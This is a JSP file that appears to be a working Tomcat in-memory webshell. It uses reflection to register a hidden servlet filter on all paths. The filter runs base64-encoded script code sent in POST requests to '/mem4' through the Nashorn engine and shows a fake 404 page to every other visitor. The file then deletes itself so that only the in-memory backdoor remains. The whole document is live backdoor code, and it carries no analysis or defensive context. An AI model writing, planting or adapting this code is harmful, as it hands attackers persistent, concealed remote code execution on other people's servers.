<%@ page language="java" contentType="text/plain;charset=UTF-8" %>
<%@ page import="java.io.*,java.util.*,java.lang.reflect.*,javax.script.*" %>
<%!
static boolean injected = false;
static Class<?> sFilterClass, sServletReqClass, sServletRespClass, sHttpReqClass, sHttpRespClass;
static ScriptEngine sEngine;

static final String PAGE_404 = "<!doctype html><html lang=\"en\"><head><title>HTTP Status 404 – Not Found</title><style type=\"text/css\">H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}.line {height: 1px; background-color: #525D76; border: none;}</style></head><body><h1>HTTP Status 404 – Not Found</h1><hr class=\"line\" /><p><b>Type</b> Status Report</p><p><b>Message</b> The requested resource is not available.</p><p><b>Description</b> The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.</p><hr class=\"line\" /><h3>Apache Tomcat</h3></body></html>";

void inject(PageContext ctx, HttpServletRequest hreq) throws Exception {
    if (injected) return;
    ServletContext sc = ctx.getServletContext();

    Object appCtx = null;
    for (Field f : sc.getClass().getDeclaredFields()) {
        if (f.getName().equals("context")) {
            f.setAccessible(true);
            appCtx = f.get(sc);
            break;
        }
    }
    if (appCtx == null) appCtx = sc;

    Object stdCtx = null;
    for (Field f : appCtx.getClass().getDeclaredFields()) {
        if (f.getName().equals("context")) {
            f.setAccessible(true);
            stdCtx = f.get(appCtx);
            break;
        }
    }
    if (stdCtx == null || !stdCtx.getClass().getName().contains("StandardContext")) {
        Object candidate = appCtx;
        for (int i = 0; i < 5 && candidate != null; i++) {
            if (candidate.getClass().getName().contains("StandardContext")) {
                stdCtx = candidate; break;
            }
            try { candidate = candidate.getClass().getMethod("getParent").invoke(candidate); }
            catch (Exception e) { candidate = null; }
        }
    }
    if (stdCtx == null) throw new Exception("Cannot find StandardContext");

    sFilterClass = Class.forName("javax.servlet.Filter");
    sServletReqClass = Class.forName("javax.servlet.ServletRequest");
    sServletRespClass = Class.forName("javax.servlet.ServletResponse");
    sHttpReqClass = Class.forName("javax.servlet.http.HttpServletRequest");
    sHttpRespClass = Class.forName("javax.servlet.http.HttpServletResponse");
    sEngine = new ScriptEngineManager().getEngineByName("nashorn");

    Object filter = Proxy.newProxyInstance(
        sFilterClass.getClassLoader(),
        new Class[]{sFilterClass},
        new InvocationHandler() {
            public Object invoke(Object proxy, Method m, Object[] args) throws Throwable {
                if (!"doFilter".equals(m.getName())) return null;
                Object req = args[0], res = args[1], chain = args[2];
                try {
                    String uri = (String) sHttpReqClass.getMethod("getRequestURI").invoke(req);
                    if (uri != null && uri.endsWith("/mem4")) {
                        String method = (String) sHttpReqClass.getMethod("getMethod").invoke(req);

                        InputStream is = (InputStream) sServletReqClass.getMethod("getInputStream").invoke(req);
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        byte[] buf = new byte[4096];
                        int len;
                        while ((len = is.read(buf)) != -1) baos.write(buf, 0, len);
                        String body = new String(baos.toByteArray(), "UTF-8").trim();

                        String code = null, rawText = null;
                        if (!body.isEmpty()) {
                            for (String p : body.split("&")) {
                                if (p.startsWith("guangnian=")) {
                                    String raw = p.substring(10);
                                    try { raw = java.net.URLDecoder.decode(raw, "UTF-8"); } catch (Exception e2) {}
                                    rawText = raw;
                                    try { code = new String(Base64.getDecoder().decode(raw), "UTF-8"); }
                                    catch (Exception e2) { code = raw; }
                                    break;
                                }
                            }
                        }

                        // Raw body fallback (no guangnian= prefix)
                        if (code == null && !body.isEmpty()) {
                            rawText = body;
                            try { code = new String(Base64.getDecoder().decode(body), "UTF-8"); }
                            catch (Exception e2) { code = body; }
                        }

                        // Only respond to POST with valid guangnian payload; else 404
                        if ("POST".equalsIgnoreCase(method) && code != null && !code.isEmpty()) {
                            StringWriter sw = new StringWriter();
                            sEngine.getContext().setWriter(sw);
                            sEngine.getContext().setErrorWriter(sw);
                            try { sEngine.eval(code); } catch (Exception e3) {
                                sw.write(rawText != null ? rawText : "guangnian\n");
                            }
                            String output = sw.toString();
                            if (!output.contains("guangnian")) output = "guangnian\n" + output;
                            sHttpRespClass.getMethod("setContentType", String.class).invoke(res, "text/plain;charset=UTF-8");
                            Object w = sHttpRespClass.getMethod("getWriter").invoke(res);
                            w.getClass().getMethod("write", String.class).invoke(w, output);
                            w.getClass().getMethod("flush").invoke(w);
                        } else {
                            sHttpRespClass.getMethod("setStatus", int.class).invoke(res, 404);
                            sHttpRespClass.getMethod("setContentType", String.class).invoke(res, "text/html;charset=UTF-8");
                            Object w = sHttpRespClass.getMethod("getWriter").invoke(res);
                            w.getClass().getMethod("write", String.class).invoke(w, PAGE_404);
                            w.getClass().getMethod("flush").invoke(w);
                        }
                    } else {
                        chain.getClass().getMethod("doFilter", sServletReqClass, sServletRespClass)
                            .invoke(chain, req, res);
                    }
                } catch (Exception e) {}
                return null;
            }
        }
    );

    // Register filter
    Class<?> filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
    Object filterDef = filterDefClass.newInstance();
    filterDefClass.getMethod("setFilterName", String.class).invoke(filterDef, "mem5");
    filterDefClass.getMethod("setFilterClass", String.class).invoke(filterDef, "mem5");
    filterDefClass.getMethod("setFilter", sFilterClass).invoke(filterDef, filter);
    stdCtx.getClass().getMethod("addFilterDef", filterDefClass).invoke(stdCtx, filterDef);

    Class<?> filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
    Object filterMap = filterMapClass.newInstance();
    filterMapClass.getMethod("setFilterName", String.class).invoke(filterMap, "mem5");
    filterMapClass.getMethod("addURLPattern", String.class).invoke(filterMap, "/*");
    stdCtx.getClass().getMethod("addFilterMapBefore", filterMapClass).invoke(stdCtx, filterMap);
    stdCtx.getClass().getMethod("filterStart").invoke(stdCtx);

    // Self-delete
    String realPath = (String) sc.getClass().getMethod("getRealPath", String.class).invoke(sc, "/");
    if (realPath != null) {
        try {
            String path = realPath;
            if (!path.endsWith("/")) path += "/";
            String name = hreq.getServletPath();
            if (name.startsWith("/")) name = name.substring(1);
            new File(path + name).delete();
        } catch (Exception ign) {}
    }

    injected = true;
}
%>
<%
try {
    inject(pageContext, request);
    out.print("guangnian\ninjected");
} catch (Exception e) {
    StringWriter sw2 = new StringWriter();
    e.printStackTrace(new PrintWriter(sw2));
    out.print("guangnian\ninject failed: " + sw2.toString());
}
%>
